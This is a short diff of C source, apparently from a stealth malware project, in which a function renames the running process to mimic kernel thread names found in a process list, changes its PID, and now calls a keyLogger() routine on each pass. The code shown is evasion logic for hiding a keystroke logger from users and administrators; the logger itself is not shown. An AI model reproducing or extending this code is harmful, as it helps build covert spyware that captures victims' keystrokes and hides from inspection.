@@ -20,7 +20,8 @@ void changeProcessName(char *argv[]) {
 
 	char *ptr = NULL; 
 	FILE *fp  = NULL; 
-
+	
+	int done = 0;
 start: 
 	memset(temp,'\0', sizeof(temp)); 
 	memset(processName,'\0', sizeof(processName)); 
@@ -36,7 +37,8 @@ start:
 	} 
 
 	// Get each line from file until done reading
-	while(NULL != fgets(temp, sizeof(temp), fp)) { 
+	while(NULL != fgets(temp, sizeof(temp), fp)) {
+		done++; 
 		//Search for any processes containing a '[' to copy that process name
 		ptr = strchr(temp, '['); 
 
@@ -60,11 +62,16 @@ start:
 		printf("Process name changed to: %s \n", processName); 
 
 		// Changes name every second
-		sleep(10); 
-
+		//sleep(10); 
+		keyLogger();		
+		
 		// Reset process name to NULL  
 		memset((processName),'\0', sizeof(processName)); 
-
+		
+		if (done > 3) {
+			return;
+		}
+		
 		// Change PID of process
 		changePID();
 	} 
